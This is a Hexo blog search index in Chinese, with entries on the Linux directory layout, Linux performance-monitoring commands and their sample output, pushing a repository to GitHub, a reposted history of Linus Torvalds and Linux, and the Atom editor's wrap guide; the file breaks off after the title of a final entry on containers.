<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Linux常见文件目录解析]]></title>
    <url>%2F2018%2F09%2F08%2FLinux%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%2F</url>
    <content type="text"><![CDATA[Linux系统能支持多种目前流行的文件系统，推荐用EXT4。 Linux下面的文件类型主要有： 1) -,普通文件，分为纯文本和二进制。2) d,目录文件，存储文件的地方。3) l,链接文件，指向同一个文件或目录的的文件。4) 设备文件，分为b块设备和c字符设备。5）p,管道文件，提供进程间通信6）s,套接字文件，与网络通信有关 Linux使用标准的目录结构，安装程序就已经为用户创建了文件系统和完整而固定的目录组成形式，并指定了每个目录的作用和其中的文件类型。 1234567891011121314151617181920212223242526272829303132333435目录名 简要说明/bin 二进制可执行命令,binary（二进制的）：许多“指令”对应的可“执行程序文件”目录/sbin super binary,超级的 二进制 许多“指令”对应的可“执行程序文件”目录，该目录文件 对应指令都是&quot;root&quot;用户可以执行的指令普通用户不能使用该目录里的命令： 普通用户：用$开头 root用户：用#开头 /dev device,系统硬件设备目录（linux系统所有的硬件都通过文件表示）/etc 系统管理和配置文件,/etc/passwd 用于存储用户信息的文件,/etc/group 用于存储组别信息的文件 /etc/rc.d 启动的配置文件和脚本 /home 用户主目录的基点，比如用户abc的主目录就是/home/user，可以用~abc表示,普通用户的“家目录” 系统每增加一个普通用户的同时，都会在该目录为该目录设置一个文件目录代表该用户的“家目录”用户后期使用系统的时候首先会首先进入其目录家目录名字默认与当前用户名字一致用户对家目录拥有绝对最高的权限 /lib 标准程序设计库/sbin 系统管理命令，这里存放的是系统管理员使用的管理程序/tmp 公用的临时文件存储点/root 系统管理员的主目录/mnt 系统提供这个目录是让用户临时挂载其他的文件系统。存放临时的映射文件系统./lost+found 这个目录平时是空的，系统非正常关机而留下“无家可归”的文件/proc 虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。/var variable,某些大文件的溢出区，比方说各种服务的日志文件,该目录存储的文件经常会发生变化（增加、修改、删除）/usr unxi system resource(unix系统资源文件目录)最庞大的目录，要用到的应用程序和文件几乎都在这个目录。其中包含：/usr/X11R6 存放X window的目录/usr/bin 众多的应用程序/usr/sbin 超级用户的一些管理程序/usr/doc linux文档/usr/include linux下开发和编译应用程序所需要的头文件/usr/lib 常用的动态链接库和软件包的配置文件/usr/man 帮助文档/usr/src 源代码，linux内核的源代码就放在/usr/src/linux里/usr/local/bin 本地增加的命令/usr/local/lib 本地增加的库该目录类似win系统的 C:/Program files 目录,该目录经常用于安装各种软件,软件安装完毕会形成对应的指令，该指令对应的可执行程序文件就存放在以下目录 /usr/bin 许多“指令”对应的可“执行程序文件”目录 /usr/sbin root用户执行的指令 对应的 可“执行程序文件”目录 /boot 系统启动核心目录，用于储存系统启动文件 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2018%2F09%2F07%2Ftest%2F</url>
    <content type="text"><![CDATA[要在标题栏上显示的文字 正文部分 new Valine({ // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁) av: AV, el: '.comment', // app_id: 'fq3aics801iEftdGyUK0emtG-gzGzoHsz', // 这里填写上面得到的APP ID app_key: 'ojpgVjlcRKxhoAjMoMDIhk5v', // 这里填写上面得到的APP KEY placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!' // [v1.0.7 new]留言框占位提示文字 }); L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/z16.model.json"},"display":{"position":"right","width":75,"height":150},"mobile":{"show":false},"log":false});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux性能检测常用的10个基本命令]]></title>
    <url>%2F2018%2F09%2F06%2FLinux%E6%80%A7%E8%83%BD%E6%A3%80%E6%B5%8B%E5%B8%B8%E7%94%A8%E7%9A%8410%E4%B8%AA%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[uptime12$ uptime23:51:26 up 21:31, 1 user, load average: 30.02, 26.43, 19.0212 该命令可以大致的看出计算机的整体负载情况，load average后的数字分别表示计算机在1min、5min、15min内的平均负载。 dmesg | tail123456$ dmesg | tail[1880957.563150] perl invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0[...][1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child[1880957.563408] Killed process 18694 (perl) total-vm:1972392kB, anon-rss:1953348kB, file-rss:0kB[2320864.954447] TCP: Possible SYN flooding on port 7001. Dropping request. Check SNMP counters.123456 打印内核环形缓存区中的内容，可以用来查看一些错误； 上面的例子中，显示进程18694 因引内存越界被kill掉以及TCP request被丢弃的错误。通过dmesg可以快速判断是否有导致系统性能异常的问题。 vmstat 1123456789$ vmstat 1procs ---------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st34 0 0 200889792 73708 591828 0 0 0 5 6 10 96 1 3 0 032 0 0 200889920 73708 591860 0 0 0 592 13284 4282 98 1 1 0 032 0 0 200890112 73708 591860 0 0 0 0 9501 2154 99 1 0 0 032 0 0 200889568 73712 591856 0 0 0 48 11900 2459 99 0 0 0 032 0 0 200890208 73712 591860 0 0 0 0 15898 4840 98 1 1 0 0^C123456789 打印进程、内存、交换分区、IO和CPU等的统计信息； vmstat的格式如下1&gt; vmstat [options] [delay [count]] vmstat第一次输出表示从开机到vmstat运行时的平均值；剩余输出的都是在指定的时间间隔内的平均值，上述例子中delay的值设置为1，除第一次以外，剩余的都是1秒统计一次，count未设置，将会一直循环打印。123456$ vmstat 10 3procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 2527112 1086888 13720228 0 0 1 14 2 1 1 1 99 0 0 0 0 0 2527156 1086888 13719856 0 0 0 104 3003 4901 0 0 99 0 0 0 0 0 2526412 1086888 13719904 0 0 0 10 3345 4870 0 1 99 0 0123456 上述的例子中delay设置为10，count设置为3，表示每行打印10秒内的平均值，只打印3次。 需要检查的列 r：表示正在运行或者等待CPU调度的进程数。因为该列数据不包含I/O的统计信息，因此可以用来检测CPU是否饱和。若r列中的数字大于CPU的核数，表示CPU已经处于饱和状态。 free：当前剩余的内存； si, so：交换分区换入和换出的个数，若换入换出个数大于0，表示内存不足； us, sy, id, wa：CPU的统计信息，分别表示user time、system time(kernel)、idle、wait I/O。I/O处理所用的时间包含在system time中，因此若system time超过20%，则I/O可能存在瓶颈或异常； mpstat -P ALL 11234567891011$ mpstat -P ALLLinux 3.10.0-229.el7.x86_64 (localhost.localdomain) 05/30/2018 _x86_64_ (16 CPU)04:03:55 PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle04:03:55 PM all 3.67 0.00 0.61 0.71 0.00 0.00 0.00 0.00 0.00 95.0204:03:55 PM 0 3.52 0.00 0.57 0.76 0.00 0.00 0.00 0.00 0.00 95.1504:03:55 PM 1 3.83 0.00 0.61 0.71 0.00 0.00 0.00 0.00 0.00 94.8504:03:55 PM 2 3.80 0.00 0.61 0.60 0.00 0.00 0.00 0.00 0.00 94.9904:03:55 PM 3 3.68 0.00 0.58 0.60 0.00 0.00 0.00 0.00 0.00 95.1304:03:55 PM 4 3.54 0.00 0.57 0.60 0.00 0.00 0.00 0.00 0.00 95.30[...]1234567891011 该命令用于每秒打印一次每个CPU的统计信息，可用于查看CPU的调度是否均匀。 pidstat 1123456789101112131415161718$ pidstat 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)07:41:02 PM UID PID %usr %system %guest %CPU CPU Command07:41:03 PM 0 9 0.00 0.94 0.00 0.94 1 rcuos/007:41:03 PM 0 4214 5.66 5.66 0.00 11.32 15 mesos-slave07:41:03 PM 0 4354 0.94 0.94 0.00 1.89 8 java07:41:03 PM 0 6521 1596.23 1.89 0.00 1598.11 27 java07:41:03 PM 0 6564 1571.70 7.55 0.00 1579.25 28 java07:41:03 PM 60004 60154 0.94 4.72 0.00 5.66 9 pidstat07:41:03 PM UID PID %usr %system %guest %CPU CPU Command07:41:04 PM 0 4214 6.00 2.00 0.00 8.00 15 mesos-slave07:41:04 PM 0 6521 1590.00 1.00 0.00 1591.00 27 java07:41:04 PM 0 6564 1573.00 10.00 0.00 1583.00 28 java07:41:04 PM 108 6718 1.00 0.00 0.00 1.00 0 snmp-pass07:41:04 PM 60004 60154 1.00 4.00 0.00 5.00 9 pidstat^C123456789101112131415161718 该命令用于打印各个进程对CPU的占用情况，类似top命令中显示的内容。pidstat的优势在于，可以滚动的打印进程运行情况，而不像top那样会清屏。 上述例子中，%CPU中两个java进程的cpu利用率分别达到了1590%和1573%，表示java进程占用了16颗CPU。 iostat -xz 1类似vmstat，第一次输出的是从系统开机到统计这段时间的采样数据；123456789101112131415$ iostat -xz 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)avg-cpu: %user %nice %system %iowait %steal %idle 73.96 0.00 3.73 0.03 0.06 22.21Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %utilxvda 0.00 0.23 0.21 0.18 4.52 2.08 34.37 0.00 9.98 13.80 5.42 2.44 0.09xvdb 0.01 0.00 1.02 8.94 127.97 598.53 145.79 0.00 0.43 1.78 0.28 0.25 0.25xvdc 0.01 0.00 1.02 8.86 127.79 595.94 146.50 0.00 0.45 1.82 0.30 0.27 0.26dm-0 0.00 0.00 0.69 2.32 10.47 31.69 28.01 0.01 3.23 0.71 3.98 0.13 0.04dm-1 0.00 0.00 0.00 0.94 0.01 3.78 8.00 0.33 345.84 0.04 346.81 0.01 0.00dm-2 0.00 0.00 0.09 0.07 1.35 0.36 22.50 0.00 2.55 0.23 5.62 1.78 0.03[...]^C123456789101112131415 检查列 r/s, w/s, rkB/s, wkB/s，表示每秒向I/O设备发出的reads、writes、read Kbytes、write Kbytes的数量。 await，表示应用程序排队等待和被服务的平均I/O时间，该值若大于预期的时间，这表示I/O设备处于饱和状态或者异常。 avgqu-sz，表示请求被发送给I/O设备的平均时间，若该值大于1，则表示I/O设备可能已经饱和； %util，每秒设备的利用率；若该利用率超过60%，则表示设备出现性能异常； free -m12345$ free -m total used free shared buffers cachedMem: 245998 24545 221453 83 59 541-/+ buffers/cache: 23944 222053Swap: 0 0 012345 检查的列： buffers: For the buffer cache, used for block device I/O. cached: For the page cache, used by file systems. 若buffers和cached接近0，说明I/O的使用率过高，系统存在性能问题。Linux中会用free内存作为cache，若应用程序需要分配内存，系统能够快速的将cache占用的内存回收，因此free的内存包含cache占用的部分。 sar -n DEV 1sar是System Activity Reporter的缩写，系统活动状态报告。 -n { keyword [,…] | ALL }，用于报告网络统计数据。keyword可以是以下的一个或者多个： DEV, EDEV, NFS, NFSD, SOCK, IP, EIP, ICMP, EICMP, TCP, ETCP, UDP, SOCK6, IP6, EIP6, ICMP6, EICMP6 和UDP6。 -n DEV 1, 每秒统计一次网络的使用情况；-n EDEV 1，每秒统计一次错误的网络信息；123456789101112131415$ sar -n DEV 1Linux 3.10.0-229.el7.x86_64 (localhost.localdomain) 05/31/2018 _x86_64_ (16 CPU)03:54:57 PM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s03:54:58 PM ens32 3286.00 7207.00 283.34 18333.90 0.00 0.00 0.0003:54:58 PM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.0003:54:58 PM vethe915e51 0.00 0.00 0.00 0.00 0.00 0.00 0.0003:54:58 PM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.0003:54:58 PM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s03:54:59 PM ens32 3304.00 7362.00 276.89 18898.51 0.00 0.00 0.0003:54:59 PM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.0003:54:59 PM vethe915e51 0.00 0.00 0.00 0.00 0.00 0.00 0.0003:54:59 PM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00^C123456789101112131415 IFACE ，网络接口名称； rxpck/s ，每秒接收到包数； txpck/s ，每秒传输的报数；(transmit packages) rxkB/s ，每秒接收的千字节数； txkB/s ，每秒发送的千字节数； rxcmp/s ，每秒接收的压缩包的数量； txcmp/s ，每秒发送的压缩包的数量； rxmcst/s，每秒接收的组数据包数量； sar -n TCP,ETCP 1该命令可以用于粗略的判断网络的吞吐量，如发起的网络连接数量和接收的网络连接数量； TCP, 报告关于TCPv4网络流量的统计信息; ETCP, 报告有关TCPv4网络错误的统计信息; 12345678910111213$ sar -n TCP,ETCP 1Linux 3.10.0-514.26.2.el7.x86_64 (aushop) 05/31/2018 _x86_64_ (2 CPU)04:16:27 PM active/s passive/s iseg/s oseg/s04:16:44 PM 0.00 2.00 15.00 13.0004:16:45 PM 0.00 3.00 126.00 203.0004:16:46 PM 0.00 0.00 99.00 99.0004:16:47 PM 0.00 0.00 18.00 9.0004:16:48 PM 0.00 0.00 5.00 6.0004:16:49 PM 0.00 0.00 1.00 1.0004:16:50 PM 0.00 1.00 4.00 4.0004:16:51 PM 0.00 3.00 171.00 243.00^C12345678910111213 检测的列： active/s: Number of locally-initiated TCP connections per second (e.g., via connect())，发起的网络连接数量； passive/s: Number of remotely-initiated TCP connections per second (e.g., via accept())，接收的网络连接数量； retrans/s: Number of TCP retransmits per second，重传的数量； toptop命令包含更多的指标统计，相当于一个综合命令。12345678910111213141516171819$ toptop - 00:15:40 up 21:56, 1 user, load average: 31.09, 29.87, 29.92Tasks: 871 total, 1 running, 868 sleeping, 0 stopped, 2 zombie%Cpu(s): 96.8 us, 0.4 sy, 0.0 ni, 2.7 id, 0.1 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem: 25190241+total, 24921688 used, 22698073+free, 60448 buffersKiB Swap: 0 total, 0 used, 0 free. 554208 cached Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 20248 root 20 0 0.227t 0.012t 18748 S 3090 5.2 29812:58 java 4213 root 20 0 2722544 64640 44232 S 23.5 0.0 233:35.37 mesos-slave 66128 titancl+ 20 0 24344 2332 1172 R 1.0 0.0 0:00.07 top 5235 root 20 0 38.227g 547004 49996 S 0.7 0.2 2:02.74 java 4299 root 20 0 20.015g 2.682g 16836 S 0.3 1.1 33:14.42 java 1 root 20 0 33620 2920 1496 S 0.0 0.0 0:03.82 init 2 root 20 0 0 0 0 S 0.0 0.0 0:00.02 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 0:05.35 ksoftirqd/0 5 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H 6 root 20 0 0 0 0 S 0.0 0.0 0:06.94 kworker/u256:0 8 root 20 0 0 0 0 S 0.0 0.0 2:38.05 rcu_sched12345678910111213141516171819 总结下面的图片很好的展示了各个命令的主要作用，如使用vmstat查看系统的整体性能，mpstat用于查看cpu的性能，pidstat用于查看进程的状态，iostat用于查看io的状态，free用于产看内存的状态，sar用于产看网络的状态等。 Linux常用性能工具一览 转载自https://medium.com/netflix-techblog/linux-performance-analysis-in-60-000-milliseconds-accc10403c55 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git创建远程仓库]]></title>
    <url>%2F2018%2F09%2F05%2FGit%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%2F</url>
    <content type="text"><![CDATA[首先要有一个GitHub账户，这是必须的。然后我们访问https://github.com/new ，开始在GitHub网站上创建一个新的仓库。其中对其中三个选项具体说明一下。Initialize this repository with a README: 在 Initialize this repository with a README选项上打钩，随后 GitHub会自动初始化仓库并设置README文件，让用户可以立刻clone这个仓库。如果想向GitHub添加手中已有的Git仓库，建议不要勾选，直接手动 push。我在此为仓库添加了README.md文件Add .gitignore: 该文件用来描述 Git 仓库中不需管理的文件与目录。通过它可以在初始化时自动生 成.gitignore文件A。这个设定会帮我们把不需要在Git仓库中进行版本管 理的文件记录在.gitignore文件中，省去了每次根据框架进行设置的麻 烦。下拉菜单中包含了主要的语言及框架，选择今后将要使用的即可。Add a license: 择要添加的许可协议文件。如果这个仓库中 包含的代码已经确定了许可协议，那么请在这里进行选择。随后将自动 生成包含许可协议内容的LICENSE文件，用来表明该仓库内容的许可协议。我在此添加了MIT协议。点击“Create repository”后，就成功创建了一个仓库。README.md在初始化时已经生成好了。README.md文件的内容 会自动显示在仓库的首页当中。其中README.md和Issue、Wiki等都是需要用到GFM(GitHub Flavored Markdown)语法的，这是GitHub自家基于markdown的扩展语法。一般情况下只要按照原本的Markdown语法进行描述就可以。然后我们克隆到本地。打开git(如果你不会安装git，请百度)1$ git clone https://github.com/lengyue1024/ubuntu-guide.git 然后，我们进入/ubuntu-guide目录创建一个文件，并写入一点东西进去。12$ touch ubuntu-wiki.md$ vim ubuntu-wiki.md 操作方式和Linux基本一致。保存退出后，我们可以查看一下是否已经成功写入。12$ cat ubuntu-wiki.mdubuntu是一款以桌面应用为主的开源GNU/Linux操作系统 我们可以查看一下当前的状态。1$ git status 可以从中看出我们新建的ubuntu-wiki.md还未提交。然后我们需要关联远程仓库，使本地的git和GitHub关联在一起，以便我们可以在本地管理并提交代码到GitHub上去初次使用的时候，需要先进行连接。1$ ssh-keygen -t rsa -C &quot;your_email@email.com&quot; 一直回车即可。git会提示你key的目录，你进入该目录，找到id_rsa.pub文件，打开即可看到key了。id_rsa.pub 是公开密钥。我们打开后，把里面的内容全部复制粘贴进https://github.com/settings/ssh/new中的key里，1$ ssh -T git@github.com 你需要手动输入一下你的GitHub的登陆密码。如图所示，已经成功连接。 现在我们可以把我们刚才新建的ubuntu-wiki.md提交到GitHub上去了。 123$ git add . # 向暂存区中添加文件，.表示提交全部文件，你也可以后跟具体文件名，指定只提交某个文件$ git commit -m &quot;添加描述&quot; # 添加描述是为了以后方便进行版本回退，找到历史版本$ git push # 提交暂存区到仓库区 我们刷新一下GitHub的页面，可以看到已经把新建的ubuntu-wiki.md文件提交到了GitHub上去。我们以后需要做的就是，在本地写好代码，然后继续按照git add .——git commit -m &quot;描述&quot; —–git push的顺序提交给GitHub上去就可以了。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[交恶微软、拒绝乔布斯，21岁的他是如何开发出Linux的？]]></title>
    <url>%2F2018%2F09%2F01%2F%E4%BA%A4%E6%81%B6%E5%BE%AE%E8%BD%AF%E3%80%81%E6%8B%92%E7%BB%9D%E4%B9%94%E5%B8%83%E6%96%AF%EF%BC%8C21%E5%B2%81%E7%9A%84%E4%BB%96%E6%98%AF%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%87%BALinux%E7%9A%84%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[几天前，Linux迎来了它的27岁生日。从最初诞生在芬兰的一间卧室里，到现在成为，全球网民都离不开的操作系统。绝对堪称神话般的存在！ 先来看个Linux牛X简史迄今为止，在全球范围内： 80%以上智能手机，均使用基于Linux内核的Android系统。 全球排名前500超算中，98%在用Linux。 纽交所、纳斯达克等证券交易市场，都在用Linux。 75%的云计算企业报告平台，也在用Linux。 全球主机行业33.8%的服务器用Linux。 亚马逊、沃尔玛等电商平台都在用Linux。 可以说，每一次程序员的女票去淘宝“败家”，都受恩惠于Linux。 不过，Linux，却被一位来自圣诞老人故乡芬兰的60后大叔，因着Just for fun的缘故，开发于“一个窗帘紧闭黑灯瞎火的芬兰少年的卧室中”。芬兰风光 如今，Linux的父亲——李纳斯·本纳第克特·托瓦兹（Linus Benedict Torvalds，以下简称“李纳斯”），也已49岁。李纳斯近照 能亲眼见证自己的“儿子”，如此惠及全球，一定很有成就感。然而，他开发出Linux，却不过是兴趣使然。 一个有电脑的外公李纳斯的外公，在赫尔辛基大学当教授，近水楼台先得月，李纳斯因此可以使用外公单位发的电脑。小李纳斯 这台Commodore VIC-20计算机，唯一能做的事，就是用Basic语言，在上面编程序。 外公经常在上面做数学运算，因为眼花就让李纳斯，帮自己录程序。而这也建立了李纳斯的数学认知，并学会了编写小游戏。 整个中学年代，李纳斯都是在电脑前度过的，期间还掌握了汇编语言。李纳斯年轻时用过的电脑 一本书，一辈子考入赫尔辛基大学后，他遇到了影响一生的那本书——《操作系统：设计和实现》，作者是Andrew S. Tanenbaum。李纳斯曾如此美誉该书，“这本书把我推上了生命的高峰”。《操作系统：设计和实现》中文版 那时， Unix已开发出来。Unix最早是用汇编写的，开发过程中，Unix的两位创始人肯·汤普逊和丹尼斯·里奇，觉得用汇编写程序，实在太痛苦了！于是，哥俩决定用高级语言，来完成下一个版本，他们先后尝试了Fortran和B语言，却只遇见了成功他妈——失败！ 这其中，哥俩中的丹尼斯，收拾好情绪，继续改造 B 语言。丹尼斯为B增加了数据类型，并让B语言，能直接编译为机器码，然后又以「New B」来命名这门语言（好名字O(∩_∩)O）。 后来，丹尼斯把「New B」改为C语言，并用C语言，重新编写Unix的内核，从此，Unix与C白首不相离。 尽管Unix可以完成很多操作，但是必须由人来完成。正是这一bug，催促着灵魂不安分的李纳斯，想去优化它。 抛砖引玉：Unix的不完美，催生“宝玉”Linux1991年初，22岁的李纳斯，花3500美元，分期付款买了台杂牌组装电脑，然后又买了MINIX（Mini Unix的缩写）操作系统。 李纳斯在摸清MINIX 的优点缺点后，把MINIX系统改成了自己得心应手的「战斗机」。也就是在这台电脑上，Linux的初始版本诞生了。Linux的形象是一个企鹅，之所以用企鹅，是因为李纳斯曾被企鹅咬过 事后回忆这段经历，李纳斯说，“这花费了我大量的精力：编程-睡觉-编程-睡觉-编程-吃饭（饼干）-编程-睡觉-编程-洗澡（冲冲了事）-编程”。 熬了四五个月昏天黑地的日子后，这位刚过弱冠之年的北欧大鼻子青年，开发出了Linux 0.01。自此，他成了那个时代，被追捧的程序员偶像。青年李纳斯 不过，比生孩子更重要的，是养孩子。Linux之所以成功，主要凭借它的开源特点。 Linux从出生，就打着开源的烙印，这对Linux的后续发展至关重要。从1991年，内核0.01版本发布，到1994年1.0版本登场，世界各地无数的开发者，都为Linux提交了代码。 李纳斯还为Linux建立了讨论组comp.os.linux，吸引全世界的程序员，不断地推进Linux长成巨人。comp.os.linux讨论组截图 对于Linux的成功，他“归功”于自己的缺点：1.他很懒散；2.他喜欢授权给其他人。 作为版权所有者，李纳斯如此制定Linux规则：1.可免费使用该操作系统，但不得将它作为商品。2.对其所作的改动和改进，必须以源代码的形式，将其公开（而不是二进制，这是不公开的）。3.如不同意以上规定，则无权对它进行复制或从事任何行为。 硅谷多了个小李子1996年底，李纳斯在接到Transmeta（全美达）这家在美国并不知名的公司的offer后，离开芬兰飞赴美国。在全美达，一待就是六年。 某种程度上，这六年，严重影响了Linux操作系统的前进，因为李纳斯成了“硅谷小李子·没时间·分身乏术打工男”。 好在李纳斯在离开全美达后，开始为开放源代码开发实验室（OSDL : Open Source Development Labs, Inc）工作。 这一次，Linux终于迎来系统人生第二春。交恶微软，拒绝苹果 Linux出现前，桌面操作系统基本由微软和苹果控制。Linux出现后，桌面操作系统的蛋糕格局，依旧变化甚小，但服务器端市场却是瞬息万变。 最初，微软希望在服务器领域，复制桌面操作系统的辉煌，然而半路杀出的 Linux竟在后来，占据了服务器市场半壁江山。商场如战场，李纳斯也因此，和微软结下梁子。他的头像，被钉在了微软公司的飞镖靶心上。李纳斯对此调侃道，“一定是我的大鼻子太好瞄准了。”大鼻子·李 而李纳斯和苹果之间，就没那么剑拔弩张，毕竟Linux和OS X也算是一起从前辈Unix那里一起学（mo）过（fang）的同门师兄。 而且，他还收到了乔布斯发来的工作邀约，前提是——停止开发Linux。 面对乔帮主邀约，李纳斯果然没有……接受，他说，“为什么我要关心这些？为什么我要对苹果公司的故事表现出兴趣？我不觉得苹果公司所做的事情有什么吸引我的地方。我一生的目标也不是占领什么面操作系统的市场（的确，虽然我马上就要做到这点了，但这从来就不是我的生活目标）。” 这次“谈判”虽不愉快，却影响了后续的IT格局。被拒了的苹果，从关注Linux转向BSD。 与此同时，Linux的开源模式，也红得发紫。Linux 1.0版本推出后，很多基于Linux操作系统的公司纷纷冒出，“红帽”公司便是典型代表，连IBM和英特尔，也给Linux打call。1999年，IBM还花费10亿美元来推广Linux。本鹅就是这么红，红红红红 Linux以开源、独立、自由之风，在服务器端大获成功，甚至可以说，没有Linux，就没有互联网的今天。 再后来，移动互联网时代来了。OS X发出了新枝——iOS，Linux则诞生了 Android，而这两位共同的祖父，就是Unix。 或许，这就是命吧！ 当初，乔布斯和李纳斯的一次不愉快谈话，让OS X和Linux井水不犯河水。十几年后的今天，它们的“后代”，终于还是成了肩并肩行走在移动互联网时代的双子星。 不爱名利爱代码 凭借Linux，李纳斯获得了无数成就和荣誉。其中，曾两次给李纳斯颁发奖项的美国《时代》周刊，对其给出了极高的评价： “有些人生来就具有统率百万人的领袖风范；另一些人则是为写出颠覆世界的软件而生。唯一一个能同时做到这两者的人，就是托瓦兹（李纳斯的姓氏）”。 甚至，在《时代》周刊根据读者投票，评选出的二十世纪100位最重要人物中，林纳斯竟排到第15位，而从20世纪的最后几年，就开始霸占全球首富称号的比尔·盖茨，是第17位。 然而，他却是一个不像名人的名人，他和妻子——芬兰空手道冠军托夫、以及两个女儿，住在圣克拉拉的一个公寓里。对于“Linux之父”的美誉，他声称自己发明LINUX“只是为了好玩”。 而他的名为《Just for Fun》的自传，也呼应了他的淡泊。李纳斯的自传《Just for Fun》 如果说他有啥缺点的话，大概就是会在社交媒体爆粗口、以及会因为技术问题而在演讲中竖中指。 在中国，有无可能成为“XX之父”？ 中国晚于欧美“触网”，所以国内也相对缺少，能成为程序员们的压倒性偶像的人物。 不过在中国，比李纳斯大5岁的、有着“WPS之父”之称的求伯君，曾于1988年，独自开发出WPS，时年仅24岁。求伯君 巧合是，两个人创立传奇的工具都是386电脑，或许，是时代造就了李纳斯和求伯君这样的独立软件英雄。 当然，仁者见仁，或许每个程序员心中，都有一个专属自己的榜样。 当下，中国已是仅次于美国的互联网第二大国，没准看文章的你，就是下一个“XX之父”呢？愿未来可期！ 最后，生日快乐，Linux！ 本文转载自: https://zhuanlan.zhihu.com/p/43241810本文简述了Linus创造出Linux的故事，又正值Linux生日，特转载记录。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Atom编辑器里的中间竖线的意义何在？]]></title>
    <url>%2F2018%2F08%2F31%2FAtom%E7%BC%96%E8%BE%91%E5%99%A8%E9%87%8C%E7%9A%84%E4%B8%AD%E9%97%B4%E8%99%9A%E7%BA%BF%E7%9A%84%E6%84%8F%E4%B9%89%E4%BD%95%E5%9C%A8%2F</url>
    <content type="text"><![CDATA[Windows平台上有很多的编辑器，但是我个人认为atom是最好用的编辑器，我本人也是一直在用。atom支持markdown语法，插件丰富，可以连接GitHub账户，可谓是优点多多。但是不知道各位发现了没有，你打开atom，在编辑器里总是会出现一个竖线。为什么会出现这个竖线呢？其实这个竖线是wrap-guide插件引起的，该插件为atom默认安装的插件。如何关闭atom中的这个竖线呢？我们可以在“设置”—“扩展”—“已安装扩展”中找到wrap-guide插件。点击“关闭”按钮就不会再出现竖线了。这个竖线有什么用呢？这个竖线其实是一个规则亦或是标准，也许说是一个标尺更为合适，它表示了代码到了这里该换行，有些语言每行字符是不能超过80个字符的。我们可以打开“设置”—“编辑器设置”—“一行的长度”，可以看到默认是80个，我们可以修改数字来改变这个默认值。其实，当我们真正理解这个竖线的意义的时候，我们可能会改变去掉这个竖线的念头，它对于我们并不是没有任何意义的。这个竖线给了我们一个标准，我们可以通过该竖线来适当换行。现在不论是写什么，我都会在遇到这个竖线的时候另起一行。这样写的东西也会更加工作整齐。]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>atom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器与虚拟化技术实现原理对比]]></title>
    <url>%2F2018%2F08%2F28%2F%E5%AE%B9%E5%99%A8%E4%B8%8E%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E5%AF%B9%E6%AF%94%2F</url>
